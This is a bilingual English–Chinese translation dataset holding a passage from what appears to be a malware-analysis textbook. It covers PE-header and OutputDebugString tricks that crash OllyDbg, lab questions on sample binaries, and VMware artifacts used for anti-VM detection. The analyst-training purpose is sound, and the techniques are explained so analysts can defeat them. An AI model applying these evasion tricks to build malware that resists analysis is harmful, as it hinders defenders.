- en: '***PE Header Vulnerabilities***'
  id: totrans-982
  prefs: []
  type: TYPE_NORMAL
  zh: '***PE 标头漏洞***'
- en: The first technique modifies the Microsoft PE header of a binary executable,
    causing OllyDbg to crash when loading the executable. The result is an error of
    “Bad or Unknown 32-bit Executable File,” yet the program usually runs fine outside
    the debugger.
  id: totrans-983
  prefs: []
  type: TYPE_NORMAL
  zh: 第一种技术修改了可执行二进制的 Microsoft PE 标头，导致 OllyDbg 在加载可执行文件时崩溃。结果是“无效或未知的 32 位可执行文件”错误，但程序通常在调试器外运行良好。
- en: This issue is due to the fact that OllyDbg follows the Microsoft specifica-tions
    regarding the PE header too strictly. In the PE header, there is typically a structure
    known as the IMAGE_OPTIONAL_HEADER. Figure 16-5 shows a subset of this structure.
  id: totrans-984
  prefs: []
  type: TYPE_NORMAL
  zh: 这个问题是由于 OllyDbg 对 PE 标头的 Microsoft 规范遵循得太严格。在 PE 标头中，通常有一个称为 IMAGE_OPTIONAL_HEADER
    的结构。图 16-5 显示了该结构的子集。
- en: Anti-Debugging
  id: totrans-985
  prefs: []
  type: TYPE_NORMAL
  zh: 反调试
- en: '**363**'
  id: totrans-986
  prefs: []
  type: TYPE_NORMAL
  zh: '**363**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-987
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: …
  id: totrans-988
  prefs: []
  type: TYPE_NORMAL
  zh: …
- en: …
  id: totrans-989
  prefs: []
  type: TYPE_NORMAL
  zh: …
- en: 00000000h
  id: totrans-990
  prefs: []
  type: TYPE_NORMAL
  zh: 00000000h
- en: LoaderFlags
  id: totrans-991
  prefs: []
  type: TYPE_NORMAL
  zh: LoaderFlags
- en: NumberOfRvaAndSizes
  id: totrans-992
  prefs: []
  type: TYPE_NORMAL
  zh: NumberOfRvaAndSizes
- en: 00000099h
  id: totrans-993
  prefs: []
  type: TYPE_NORMAL
  zh: 00000099h
- en: 0x99 is invalid!
  id: totrans-994
  prefs: []
  type: TYPE_NORMAL
  zh: 0x99 是无效的！
- en: DataDirectory[0]
  id: totrans-995
  prefs: []
  type: TYPE_NORMAL
  zh: DataDirectory[0]
- en: Virtual Address
  id: totrans-996
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟地址
- en: 00000000h
  id: totrans-997
  prefs: []
  type: TYPE_NORMAL
  zh: 00000000h
- en: Size
  id: totrans-998
  prefs: []
  type: TYPE_NORMAL
  zh: 大小
- en: 00000000h
  id: totrans-999
  prefs: []
  type: TYPE_NORMAL
  zh: 00000000h
- en: DataDirectory[1]
  id: totrans-1000
  prefs: []
  type: TYPE_NORMAL
  zh: DataDirectory[1]
- en: Virtual Address
  id: totrans-1001
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟地址
- en: 01007604h
  id: totrans-1002
  prefs: []
  type: TYPE_NORMAL
  zh: 01007604h
- en: 01007604h
  id: totrans-1003
  prefs: []
  type: TYPE_NORMAL
  zh: 01007604h
- en: Size
  id: totrans-1004
  prefs: []
  type: TYPE_NORMAL
  zh: 大小
- en: 000000C8h
  id: totrans-1005
  prefs: []
  type: TYPE_NORMAL
  zh: 000000C8h
- en: 000000C8h
  id: totrans-1006
  prefs: []
  type: TYPE_NORMAL
  zh: 000000C8h
- en: DataDirectory[2]
  id: totrans-1007
  prefs: []
  type: TYPE_NORMAL
  zh: DataDirectory[2]
- en: Virtual Address
  id: totrans-1008
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟地址
- en: 0100B000h
  id: totrans-1009
  prefs: []
  type: TYPE_NORMAL
  zh: 0100B000h
- en: 16 items in the
  id: totrans-1010
  prefs: []
  type: TYPE_NORMAL
  zh: 16 项在
- en: Size
  id: totrans-1011
  prefs: []
  type: TYPE_NORMAL
  zh: 大小
- en: 00008958h
  id: totrans-1012
  prefs: []
  type: TYPE_NORMAL
  zh: 00008958h
- en: 00008958h
  id: totrans-1013
  prefs: []
  type: TYPE_NORMAL
  zh: 00008958h
- en: DataDirectory Array
  id: totrans-1014
  prefs: []
  type: TYPE_NORMAL
  zh: 数据目录数组
- en: …
  id: totrans-1015
  prefs: []
  type: TYPE_NORMAL
  zh: …
- en: …
  id: totrans-1016
  prefs: []
  type: TYPE_NORMAL
  zh: …
- en: DataDirectory[15]
  id: totrans-1017
  prefs: []
  type: TYPE_NORMAL
  zh: DataDirectory[15]
- en: Virtual Address
  id: totrans-1018
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟地址
- en: 00000000h
  id: totrans-1019
  prefs: []
  type: TYPE_NORMAL
  zh: 00000000h
- en: Size
  id: totrans-1020
  prefs: []
  type: TYPE_NORMAL
  zh: 大小
- en: 00000000h
  id: totrans-1021
  prefs: []
  type: TYPE_NORMAL
  zh: 00000000h
- en: '*Figure 16-5: PE IMAGE_OPTIONAL_HEADER and NumberOfRvaAndSizes vulnerability*
    The last several elements in this structure are of particular interest. The NumberOfRvaAndSizes
    field identifies the number of entries in the DataDirectory array that follows.
    The DataDirectory array indicates where to find other important executable components
    in the file; it is little more than an array of IMAGE_DATA_DIRECTORY structures
    at the end of the optional header structure.'
  id: totrans-1022
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 16-5：PE IMAGE_OPTIONAL_HEADER 和 NumberOfRvaAndSizes 漏洞* 该结构中的最后几个元素特别引人关注。NumberOfRvaAndSizes
    字段标识了后续 DataDirectory 数组中的条目数。DataDirectory 数组指示在文件中查找其他重要可执行组件的位置；它只是可选标头结构末尾的
    IMAGE_DATA_DIRECTORY 结构数组。'
- en: Each data directory structure specifies the size and relative virtual address
    of the directory.
  id: totrans-1023
  prefs: []
  type: TYPE_NORMAL
  zh: 每个数据目录结构指定目录的大小和相对虚拟地址。
- en: The size of the array is set to IMAGE_NUMBEROF_DIRECTORY_ENTRIES, which is equal
    to 0x10\. The Windows loader ignores any NumberOfRvaAndSizes greater than 0x10,
    because anything larger will not fit in the DataDirectory array.
  id: totrans-1024
  prefs: []
  type: TYPE_NORMAL
  zh: 数组的大小设置为 IMAGE_NUMBEROF_DIRECTORY_ENTRIES，等于 0x10。Windows 加载器忽略任何大于 0x10 的 NumberOfRvaAndSizes，因为任何更大的值都不会适合
    DataDirectory 数组。
- en: OllyDbg follows the standard and uses NumberOfRvaAndSizes no matter what.
  id: totrans-1025
  prefs: []
  type: TYPE_NORMAL
  zh: OllyDbg 遵循标准，无论什么情况都使用 NumberOfRvaAndSizes。
- en: As a consequence, setting the size of the array to a value greater than 0x10
  id: totrans-1026
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，将数组的大小设置为大于 0x10 的值
- en: (like 0x99) will cause OllyDbg to generate a pop-up window to the user before
    exiting the program.
  id: totrans-1027
  prefs: []
  type: TYPE_NORMAL
  zh: （如 0x99）将导致 OllyDbg 在退出程序之前向用户弹出窗口。
- en: The easiest way to overcome this technique is to manually modify the PE header
    and set the NumberOfRvaAndSizes to 0x10 using a hex editor or PE
  id: totrans-1028
  prefs: []
  type: TYPE_NORMAL
  zh: 克服这种技术的最简单方法是通过十六进制编辑器或 PE 手动修改 PE 标头，并将 NumberOfRvaAndSizes 设置为 0x10。
- en: Explorer. Or, of course, you can use a debugger that is not vulnerable to this
    technique, such as WinDbg or OllyDbg 2.0\.
  id: totrans-1029
  prefs: []
  type: TYPE_NORMAL
  zh: Explorer。或者，当然，您也可以使用不受这种技术影响的调试器，例如 WinDbg 或 OllyDbg 2.0。
- en: Another PE header trick involves section headers, causing OllyDbg to crash during
    loading with the error “File contains too much data.” (WinDbg and OllyDbg 2.0
    are not vulnerable to this technique.) Sections contain the content of the file,
    including code, data, resources, and other information.
  id: totrans-1030
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个PE头部技巧涉及部分头部，这会导致OllyDbg在加载时崩溃，错误信息为“文件包含太多数据。”（WinDbg和OllyDbg 2.0对这种技术不敏感。）部分包含文件的内容，包括代码、数据、资源和其他信息。
- en: Each section has a header in the form of an IMAGE_SECTION_HEADER structure.
  id: totrans-1031
  prefs: []
  type: TYPE_NORMAL
  zh: 每个部分都有一个以IMAGE_SECTION_HEADER结构为形式的头。
- en: Figure 16-6 shows a subset of this structure.
  id: totrans-1032
  prefs: []
  type: TYPE_NORMAL
  zh: 图16-6显示了该结构的子集。
- en: '**364**'
  id: totrans-1033
  prefs: []
  type: TYPE_NORMAL
  zh: '**364**'
- en: Chapter 16
  id: totrans-1034
  prefs: []
  type: TYPE_NORMAL
  zh: 第16章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1035
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Name**'
  id: totrans-1036
  prefs: []
  type: TYPE_NORMAL
  zh: '**名称**'
- en: '**“.text”**'
  id: totrans-1037
  prefs: []
  type: TYPE_NORMAL
  zh: '**“.text”**'
- en: VirtualSize
  id: totrans-1038
  prefs: []
  type: TYPE_NORMAL
  zh: VirtualSize
- en: 00004C52h
  id: totrans-1039
  prefs: []
  type: TYPE_NORMAL
  zh: 00004C52h
- en: Location to virtually
  id: totrans-1040
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟位置的地址
- en: VirtualAddress
  id: totrans-1041
  prefs: []
  type: TYPE_NORMAL
  zh: VirtualAddress
- en: 00401000h
  id: totrans-1042
  prefs: []
  type: TYPE_NORMAL
  zh: 00401000h
- en: load this section
  id: totrans-1043
  prefs: []
  type: TYPE_NORMAL
  zh: 加载此部分
- en: SizeOfRawData
  id: totrans-1044
  prefs: []
  type: TYPE_NORMAL
  zh: SizeOfRawData
- en: 77777777h
  id: totrans-1045
  prefs: []
  type: TYPE_NORMAL
  zh: 77777777h
- en: 77777777h is
  id: totrans-1046
  prefs: []
  type: TYPE_NORMAL
  zh: 77777777h是
- en: Location of raw data
  id: totrans-1047
  prefs: []
  type: TYPE_NORMAL
  zh: 原始数据的位置
- en: invalid!
  id: totrans-1048
  prefs: []
  type: TYPE_NORMAL
  zh: 无效！
- en: PointerToRawData
  id: totrans-1049
  prefs: []
  type: TYPE_NORMAL
  zh: PointerToRawData
- en: 00000400h
  id: totrans-1050
  prefs: []
  type: TYPE_NORMAL
  zh: 00000400h
- en: in PE file
  id: totrans-1051
  prefs: []
  type: TYPE_NORMAL
  zh: 在PE文件中
- en: PointerToRelocations
  id: totrans-1052
  prefs: []
  type: TYPE_NORMAL
  zh: PointerToRelocations
- en: 00000000h
  id: totrans-1053
  prefs: []
  type: TYPE_NORMAL
  zh: 00000000h
- en: …
  id: totrans-1054
  prefs: []
  type: TYPE_NORMAL
  zh: …
- en: '*Figure 16-6: PE IMAGE_SECTION_HEADER structure*'
  id: totrans-1055
  prefs: []
  type: TYPE_NORMAL
  zh: '*图16-6：PE IMAGE_SECTION_HEADER结构*'
- en: The elements of interest are VirtualSize and the SizeOfRawData. According to
    the Windows PE specification, VirtualSize should contain the total size of the
    section when loaded into memory, and SizeOfRawData should contain the size of
    data on disk. The Windows loader uses the smaller of VirtualSize and SizeOfRawData
    to map the section data into memory. If the SizeOfRawData is larger than VirtualSize,
    only VirtualSize data is copied into memory; the rest is ignored. Because OllyDbg
    uses only the SizeOfRawData, setting the SizeofRawData to something large like
    0x77777777, will cause OllyDbg to crash.
  id: totrans-1056
  prefs: []
  type: TYPE_NORMAL
  zh: 我们感兴趣的是VirtualSize和SizeOfRawData这两个元素。根据Windows PE规范，VirtualSize应包含当加载到内存中时部分的总体大小，而SizeOfRawData应包含磁盘上的数据大小。Windows加载器使用VirtualSize和SizeOfRawData中较小的一个来将部分数据映射到内存中。如果SizeOfRawData大于VirtualSize，则只将VirtualSize数据复制到内存中；其余的将被忽略。因为OllyDbg只使用SizeOfRawData，将SizeOfRawData设置为类似0x77777777这样的大值，会导致OllyDbg崩溃。
- en: The easiest way to overcome this anti-debugging technique is to manually modify
    the PE header and set the SizeOfRawData using a hex editor to change the value
    to be close to VirtualSize. (Note that, according to the specification, this value
    must be a multiple of the FileAlignment value from the IMAGE_OPTIONAL_HEADER).
    PE Explorer is a great program to use for this purpose because it is not fooled
    by a large value for SizeofRawData.
  id: totrans-1057
  prefs: []
  type: TYPE_NORMAL
  zh: 克服这种反调试技术的最简单方法是通过手动修改PE头部，并使用十六进制编辑器将SizeOfRawData的值修改得接近VirtualSize。请注意，根据规范，此值必须是IMAGE_OPTIONAL_HEADER中的FileAlignment值的倍数。PE
    Explorer是一个用于此目的的绝佳程序，因为它不会被SizeOfRawData的大值所欺骗。
- en: '***The OutputDebugString Vulnerability***'
  id: totrans-1058
  prefs: []
  type: TYPE_NORMAL
  zh: '***OutputDebugString漏洞***'
- en: Malware often attempts to exploit a format string vulnerability in version 1.1
  id: totrans-1059
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件通常会尝试利用1.1版本中的格式化字符串漏洞。
- en: of OllyDbg, by providing a string of %s as a parameter to OutputDebugString
    to cause OllyDbg to crash. Beware of suspicious calls like OutputDebugString ("%s%s%s%s%s%s%s%s%s%s%s%s%s%s").
    If this call executes, your debugger will crash.
  id: totrans-1060
  prefs: []
  type: TYPE_NORMAL
  zh: 通过向OutputDebugString提供%s字符串作为参数来导致OllyDbg崩溃。小心像OutputDebugString("%s%s%s%s%s%s%s%s%s%s%s%s%s%s")这样的可疑调用。如果这个调用执行，你的调试器将会崩溃。
- en: '**Conclusion**'
  id: totrans-1061
  prefs: []
  type: TYPE_NORMAL
  zh: '**结论**'
- en: This chapter introduced you to some popular anti-debugging techniques.
  id: totrans-1062
  prefs: []
  type: TYPE_NORMAL
  zh: 本章向您介绍了一些流行的反调试技术。
- en: It takes patience and perseverance to learn to recognize and bypass anti-debugging
    techniques. Be sure to take notes during your analysis and remember the location
    of any anti-debugging techniques and how you bypass them; doing so will help you
    if you need to restart the debugging process.
  id: totrans-1063
  prefs: []
  type: TYPE_NORMAL
  zh: 要学会识别和绕过反调试技术需要耐心和毅力。务必在分析过程中做笔记，并记住任何反调试技术的位置以及你是如何绕过它们的；这样做将有助于你在需要重新启动调试过程时。
- en: Most anti-debugging techniques can be spotted using common sense, while debugging
    a process slowly. For example, if you see code terminating prematurely at a conditional
    jump, that might hint at an anti-debugging Anti-Debugging
  id: totrans-1064
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数反调试技术都可以通过在缓慢调试过程中使用常识来发现。例如，如果你看到代码在条件跳转处提前终止，这可能会暗示存在反调试技术。
- en: '**365**'
  id: totrans-1065
  prefs: []
  type: TYPE_NORMAL
  zh: '**365**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1066
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: technique. Most popular anti-debugging techniques involve accessing fs:[30h],
    calling a Windows API call, or performing a timing check.
  id: totrans-1067
  prefs: []
  type: TYPE_NORMAL
  zh: 技巧。大多数反调试技术都涉及访问fs:[30h]，调用Windows API调用或执行时间检查。
- en: Of course, as with all malware analysis, the best way to learn to thwart anti-debugging
    techniques is by continuing to reverse and study malware.
  id: totrans-1068
  prefs: []
  type: TYPE_NORMAL
  zh: 当然，与所有恶意软件分析一样，学习挫败反调试技术的最佳方法是继续逆向工程和研究恶意软件。
- en: Malware authors are always looking for new ways to thwart debuggers and to keep
    malware analysts like you on your toes.
  id: totrans-1069
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件作者总是在寻找新的方法来挫败调试器，并让像你这样的恶意软件分析师保持警惕。
- en: '**366**'
  id: totrans-1070
  prefs: []
  type: TYPE_NORMAL
  zh: '**366**'
- en: Chapter 16
  id: totrans-1071
  prefs: []
  type: TYPE_NORMAL
  zh: 第16章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1072
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**L A B S**'
  id: totrans-1073
  prefs: []
  type: TYPE_NORMAL
  zh: '**L A B S**'
- en: '**Lab 16-1**'
  id: totrans-1074
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 16-1**'
- en: Analyze the malware found in *Lab16-01.exe* using a debugger. This is the same
    malware as *Lab09-01.exe*, with added anti-debugging techniques.
  id: totrans-1075
  prefs: []
  type: TYPE_NORMAL
  zh: 使用调试器分析 *Lab16-01.exe* 中找到的恶意软件。这是与 *Lab09-01.exe* 相同的恶意软件，但增加了反调试技术。
- en: '***Questions***'
  id: totrans-1076
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-1077
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: Which anti-debugging techniques does this malware employ?
  id: totrans-1078
  prefs: []
  type: TYPE_NORMAL
  zh: 此恶意软件采用了哪些反调试技术？
- en: 2\.
  id: totrans-1079
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: What happens when each anti-debugging technique succeeds?
  id: totrans-1080
  prefs: []
  type: TYPE_NORMAL
  zh: 每种反调试技术成功时会发生什么？
- en: 3\.
  id: totrans-1081
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: How can you get around these anti-debugging techniques?
  id: totrans-1082
  prefs: []
  type: TYPE_NORMAL
  zh: 你如何绕过这些反调试技术？
- en: 4\.
  id: totrans-1083
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: How do you manually change the structures checked during runtime?
  id: totrans-1084
  prefs: []
  type: TYPE_NORMAL
  zh: 你如何手动更改运行时检查的结构？
- en: 5\.
  id: totrans-1085
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: Which OllyDbg plug-in will protect you from the anti-debugging techniques used
    by this malware?
  id: totrans-1086
  prefs: []
  type: TYPE_NORMAL
  zh: 哪个 OllyDbg 插件可以保护你免受此恶意软件使用的反调试技术的影响？
- en: '**Lab 16-2**'
  id: totrans-1087
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 16-2**'
- en: Analyze the malware found in *Lab16-02.exe* using a debugger. The goal of this
    lab is to figure out the correct password. The malware does not drop a malicious
    payload.
  id: totrans-1088
  prefs: []
  type: TYPE_NORMAL
  zh: 使用调试器分析 *Lab16-02.exe* 中找到的恶意软件。本实验的目的是找出正确的密码。恶意软件不会投放恶意有效载荷。
- en: '***Questions***'
  id: totrans-1089
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-1090
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: What happens when you run *Lab16-02.exe* from the command line?
  id: totrans-1091
  prefs: []
  type: TYPE_NORMAL
  zh: 从命令行运行 *Lab16-02.exe* 时会发生什么？
- en: 2\.
  id: totrans-1092
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: What happens when you run *Lab16-02.exe* and guess the command-line parameter?
  id: totrans-1093
  prefs: []
  type: TYPE_NORMAL
  zh: 当你运行 *Lab16-02.exe* 并猜测命令行参数时会发生什么？
- en: 3\.
  id: totrans-1094
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: What is the command-line password?
  id: totrans-1095
  prefs: []
  type: TYPE_NORMAL
  zh: 命令行密码是什么？
- en: 4\.
  id: totrans-1096
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: Load *Lab16-02.exe* into IDA Pro. Where in the main function is strncmp found?
  id: totrans-1097
  prefs: []
  type: TYPE_NORMAL
  zh: 将 *Lab16-02.exe* 加载到 IDA Pro 中。在主函数中 strncmp 在哪里被找到？
- en: 5\.
  id: totrans-1098
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: What happens when you load this malware into OllyDbg using the default settings?
  id: totrans-1099
  prefs: []
  type: TYPE_NORMAL
  zh: 当你使用默认设置将此恶意软件加载到 OllyDbg 中时，会发生什么？
- en: 6\.
  id: totrans-1100
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: What is unique about the PE structure of *Lab16-02.exe*?
  id: totrans-1101
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab16-02.exe* 的 PE 结构有什么独特之处？'
- en: 7\.
  id: totrans-1102
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: 'Where is the callback located? (Hint: Use CTRL-E in IDA Pro.) 8\.'
  id: totrans-1103
  prefs: []
  type: TYPE_NORMAL
  zh: 回调位于何处？（提示：在 IDA Pro 中使用 CTRL-E。）8.
- en: Which anti-debugging technique is the program using to terminate immediately
    in the debugger and how can you avoid this check?
  id: totrans-1104
  prefs: []
  type: TYPE_NORMAL
  zh: 程序使用哪种反调试技术立即在调试器中终止，你如何避免此检查？
- en: 9\.
  id: totrans-1105
  prefs: []
  type: TYPE_NORMAL
  zh: '9.'
- en: What is the command-line password you see in the debugger after you disable
    the anti-debugging technique?
  id: totrans-1106
  prefs: []
  type: TYPE_NORMAL
  zh: 在禁用反调试技术后，你在调试器中看到什么命令行密码？
- en: 10\. Does the password found in the debugger work on the command line?
  id: totrans-1107
  prefs: []
  type: TYPE_NORMAL
  zh: 10. 在调试器中找到的密码在命令行上是否有效？
- en: 11\. Which anti-debugging techniques account for the different passwords in
    the debugger and on the command line, and how can you protect against them?
  id: totrans-1108
  prefs: []
  type: TYPE_NORMAL
  zh: 11. 哪些反调试技术导致了调试器和命令行中的不同密码，以及如何保护自己免受它们的影响？
- en: Anti-Debugging
  id: totrans-1109
  prefs: []
  type: TYPE_NORMAL
  zh: 反调试
- en: '**367**'
  id: totrans-1110
  prefs: []
  type: TYPE_NORMAL
  zh: '**367**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1111
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 16-3**'
  id: totrans-1112
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 16-3**'
- en: Analyze the malware in *Lab16-03.exe* using a debugger. This malware is similar
    to *Lab09-02.exe*, with certain modifications, including the introduction of anti-debugging
    techniques. If you get stuck, see Lab 9-2\.
  id: totrans-1113
  prefs: []
  type: TYPE_NORMAL
  zh: 使用调试器分析 *Lab16-03.exe* 中的恶意软件。此恶意软件与 *Lab09-02.exe* 类似，但进行了某些修改，包括引入反调试技术。如果你遇到困难，请参阅第9-2章。
- en: '***Questions***'
  id: totrans-1114
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-1115
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: Which strings do you see when using static analysis on the binary?
  id: totrans-1116
  prefs: []
  type: TYPE_NORMAL
  zh: 使用静态分析在二进制文件中看到哪些字符串？
- en: 2\.
  id: totrans-1117
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: What happens when you run this binary?
  id: totrans-1118
  prefs: []
  type: TYPE_NORMAL
  zh: 运行此二进制文件时会发生什么？
- en: 3\.
  id: totrans-1119
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: How must you rename the sample in order for it to run properly?
  id: totrans-1120
  prefs: []
  type: TYPE_NORMAL
  zh: 你必须如何重命名样本才能使其正常运行？
- en: 4\.
  id: totrans-1121
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: Which anti-debugging techniques does this malware employ?
  id: totrans-1122
  prefs: []
  type: TYPE_NORMAL
  zh: 此恶意软件采用了哪些反调试技术？
- en: 5\.
  id: totrans-1123
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: For each technique, what does the malware do if it determines it is running
    in a debugger?
  id: totrans-1124
  prefs: []
  type: TYPE_NORMAL
  zh: 对于每种技术，如果恶意软件确定它在调试器中运行，它会做什么？
- en: 6\.
  id: totrans-1125
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: Why are the anti-debugging techniques successful in this malware?
  id: totrans-1126
  prefs: []
  type: TYPE_NORMAL
  zh: 为什么反调试技术在恶意软件中如此成功？
- en: 7\.
  id: totrans-1127
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: What domain name does this malware use?
  id: totrans-1128
  prefs: []
  type: TYPE_NORMAL
  zh: 此恶意软件使用什么域名？
- en: '**368**'
  id: totrans-1129
  prefs: []
  type: TYPE_NORMAL
  zh: '**368**'
- en: Chapter 16
  id: totrans-1130
  prefs: []
  type: TYPE_NORMAL
  zh: 第16章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1131
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**A N T I - V I R T U A L M A C H I N E**'
  id: totrans-1132
  prefs: []
  type: TYPE_NORMAL
  zh: '**A N T I - V I R T U A L M A C H I N E**'
- en: '**T E C H N I Q U E S**'
  id: totrans-1133
  prefs: []
  type: TYPE_NORMAL
  zh: '**T E C H N I Q U E S**'
- en: Malware authors sometimes use anti-virtual machine
  id: totrans-1134
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件作者有时会使用反虚拟机
- en: (anti-VM) techniques to thwart attempts at analysis.
  id: totrans-1135
  prefs: []
  type: TYPE_NORMAL
  zh: (反虚拟机)技术来挫败分析尝试。
- en: With these techniques, the malware attempts to detect
  id: totrans-1136
  prefs: []
  type: TYPE_NORMAL
  zh: 使用这些技术，恶意软件试图检测
- en: whether it is being run inside a virtual machine. If a
  id: totrans-1137
  prefs: []
  type: TYPE_NORMAL
  zh: 它是否在虚拟机内部运行。如果一个
- en: virtual machine is detected, it can act differently or
  id: totrans-1138
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟机被检测到时，它可以采取不同的行动或
- en: simply not run. This can, of course, cause problems
  id: totrans-1139
  prefs: []
  type: TYPE_NORMAL
  zh: 简单地不运行。这当然可能会
- en: for the analyst.
  id: totrans-1140
  prefs: []
  type: TYPE_NORMAL
  zh: 对分析师造成问题。
- en: Anti-VM techniques are most commonly found in malware that is widely deployed,
    such as bots, scareware, and spyware (mostly because honeypots often use virtual
    machines and because this malware typically targets the average user’s machine,
    which is unlikely to be running a virtual machine).
  id: totrans-1141
  prefs: []
  type: TYPE_NORMAL
  zh: 反虚拟机技术最常见于广泛部署的恶意软件，如僵尸网络、恐吓软件和间谍软件（主要是因为蜜罐通常使用虚拟机，并且这种恶意软件通常针对普通用户的机器，而这种机器不太可能运行虚拟机）。
- en: The popularity of anti-VM malware has been going down recently, and this can
    be attributed to the great increase in the usage of virtualization.
  id: totrans-1142
  prefs: []
  type: TYPE_NORMAL
  zh: 近期来，反虚拟机恶意软件的流行度有所下降，这可以归因于虚拟化使用的极大增加。
- en: Traditionally, malware authors have used anti-VM techniques because they thought
    only analysts would be running the malware in a virtual machine.
  id: totrans-1143
  prefs: []
  type: TYPE_NORMAL
  zh: 传统上，恶意软件作者使用反虚拟机技术，因为他们认为只有分析师会在虚拟机中运行恶意软件。
- en: However, today both administrators and users use virtual machines in order to
    make it easy to rebuild a machine (rebuilding had been a tedious process, but
    virtual machines save time by allowing you to go back to a snapshot).
  id: totrans-1144
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，如今管理员和用户都使用虚拟机以便于重建机器（重建曾经是一个繁琐的过程，但虚拟机通过允许你回到快照来节省时间）。
- en: Malware authors are starting to realize that just because a machine is a virtual
  id: totrans-1145
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件作者开始意识到，仅仅因为一台机器是虚拟的
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1146
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 87](index-403_1.png)'
  id: totrans-1147
  prefs: []
  type: TYPE_IMG
  zh: '![图像87](index-403_1.png)'
- en: machine does not necessarily mean that it isn’t a valuable victim. As virtualization
    continues to grow, anti-VM techniques will probably become even less common.
  id: totrans-1148
  prefs: []
  type: TYPE_NORMAL
  zh: 机器并不一定意味着它不是一个有价值的受害者。随着虚拟化的持续增长，反虚拟机技术可能会变得更加不常见。
- en: Because anti-VM techniques typically target VMware, in this chapter, we’ll focus
    on anti-VMware techniques. We’ll examine the most common techniques and how to
    defeat them by tweaking a couple of settings, removing software, or patching an
    executable.
  id: totrans-1149
  prefs: []
  type: TYPE_NORMAL
  zh: 由于反虚拟机技术通常针对VMware，在本章中，我们将重点关注反VMware技术。我们将检查最常见的技术以及如何通过调整一些设置、删除软件或修补可执行文件来击败它们。
- en: '**VMware Artifacts**'
  id: totrans-1150
  prefs: []
  type: TYPE_NORMAL
  zh: '**VMware证据**'
- en: The VMware environment leaves many artifacts on the system, especially when
    VMware Tools is installed. Malware can use these artifacts, which are present
    in the filesystem, registry, and process listing, to detect VMware.
  id: totrans-1151
  prefs: []
  type: TYPE_NORMAL
  zh: VMware环境在系统上留下了许多证据，尤其是在安装了VMware Tools的情况下。恶意软件可以使用这些证据，这些证据存在于文件系统、注册表和进程列表中，以检测VMware。
- en: 'For example, Figure 17-1 shows the process listing for a standard VMware image
    with VMware Tools installed. Notice that three VMware processes are running: *VMwareService.exe*,
    *VMwareTray.exe*, and *VMwareUser.exe*. Any one of these can be found by malware
    as it searches the process listing for the VMware string.'
  id: totrans-1152
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，图17-1显示了安装了VMware Tools的标准VMware镜像的进程列表。注意有三个VMware进程正在运行：*VMwareService.exe*、*VMwareTray.exe*
    和 *VMwareUser.exe*。恶意软件在搜索包含VMware字符串的进程列表时，可以找到任何一个。
- en: '*Figure 17-1: Process listing on a VMware image with*'
  id: totrans-1153
  prefs: []
  type: TYPE_NORMAL
  zh: '*图17-1：VMware镜像上的进程列表*'
- en: '*VMware Tools running*'
  id: totrans-1154
  prefs: []
